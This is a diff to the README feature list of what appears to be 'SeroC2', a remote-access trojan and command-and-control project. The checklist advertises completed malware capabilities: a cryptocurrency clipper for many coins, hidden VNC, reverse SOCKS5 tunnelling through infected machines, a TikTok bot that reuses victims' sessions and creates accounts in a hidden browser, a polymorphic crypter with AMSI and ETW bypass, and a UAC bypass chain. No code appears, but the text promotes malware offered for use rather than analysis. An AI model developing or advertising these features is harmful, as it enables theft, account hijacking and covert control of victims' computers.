@@ -507,9 +507,7 @@ SeroC2/
 - [x] Crypto Clipper — BTC / ETH / BNB / LTC / TRX / SOL / XMR / XRP / DASH / BCH, global server tab, auto-push on connect
 - [x] Process Manager — native Windows icons (SHGetFileInfo), memory, search, force-kill
 - [x] Reverse SOCKS5 proxy — tunnel traffic through the remote machine, local SOCKS5 listener
-- [x] TikTok — post comments on videos and livestreams using an existing session, auto-detect session on machine
-- [x] HVNC Broadcast — send commands to all HVNC sessions simultaneously (launch app, open URL, keyboard shortcuts, type text)
-- [x] TikTok Bot — multi-client panel: CDP auto-signup via Google OAuth (Chrome hidden, no HVNC), account inventory, comment broadcast with rotation across all accounts; cookie auto-flows from signup to comment panel
+- [x] TikTok Bot — multi-client panel: CDP auto-signup via Google OAuth (Chrome hidden, no HVNC), account inventory, comment broadcast with rotation across all accounts; cookie auto-flows from signup to comment panel, post comments on videos and livestreams using an existing session, auto-detect session on machine
 - [x] Stub size −2 MB — replaced `System.Management` WMI with direct registry P/Invoke (`RegSetKeyValueW`); stub now **7.44 MB** NativeAOT (all features included)
 - [x] Polymorphic Crypter — AES-256-CBC, LZNT1, AMSI+ETW bypass *(closed-source)*
 - [x] UAC Bypass chain — computerdefaults → fodhelper → sdclt → mmc *(closed-source)*
